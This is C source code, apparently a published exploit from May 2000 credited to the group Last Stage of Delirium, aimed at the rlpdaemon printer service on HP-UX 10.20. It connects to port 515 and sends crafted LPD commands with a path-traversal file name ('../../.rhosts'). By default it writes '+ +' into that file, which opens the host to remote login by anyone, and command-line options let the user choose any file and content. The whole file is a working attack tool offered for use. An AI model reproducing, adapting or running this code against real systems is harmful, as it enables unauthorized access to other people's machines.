/*## copyright LAST STAGE OF DELIRIUM may 2000 poland        *://lsd-pl.net/ #*/
/*## rlpdaemon                                                               #*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

main(int argc,char **argv){
    char buffer[10000],*infile="+ +",*file="../../.rhosts";
    int sck,i,c,lengh,on=1;
    struct sockaddr_in sadr;
    struct hostent *hp;

    printf("copyright LAST STAGE OF DELIRIUM may 2000 poland  //lsd-pl.net/\n");
    printf("rlpdaemon for HP-UX 10.20\n\n");
    
    if(argc<2){
        printf("usage: %s address [-f \"file\"] [-c \"infile\"] \n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"f:c:"))!=-1){
        switch(c){
        case 'f': file=optarg;break;
        case 'c': infile=optarg;break;
        }
    }

    sck=socket(AF_INET,SOCK_STREAM,0);
    sadr.sin_family=AF_INET;
    sadr.sin_addr.s_addr=htonl(INADDR_ANY);
    for(i=200;i<1024;i++){
        sadr.sin_port=htons(i);
        if(!bind(sck,(struct sockaddr *)&sadr,sizeof(sadr))) break;
    }if(i==1024) {perror("error");exit(-1);}

    setsockopt(sck,SOL_SOCKET,SO_REUSEADDR,(void*)&on,sizeof(on));

    sadr.sin_port=htons(515);
    if((sadr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
        memcpy(&sadr.sin_addr.s_addr,hp->h_addr,4);
    }

    if(connect(sck,(struct sockaddr*)&sadr,sizeof(sadr))<0){
        perror("error");exit(-1);
    }

    lengh=strlen(infile)+1; 
    sprintf(buffer,"%c%s\n",(unsigned char)(2),"lp");
    write(sck,buffer,strlen(buffer));
    if(i=read(sck,buffer,1024)!=1) {printf("lp error");exit(-1);}
    
    sprintf(buffer,"%c%d %s\n",(unsigned char)(3),lengh,file);
    write(sck,buffer,strlen(buffer));
    if(i=read(sck,buffer,1024)!=1) {printf("lp error");exit(-1);}

    sprintf(buffer,"%s\n",infile);
    write(sck,buffer,strlen(buffer));
    write(sck,"\0",1);
    read(sck,buffer,1024);
    printf("creating file: %s\n",file);
    printf("content: %s\n",infile);
    close(sck);
}

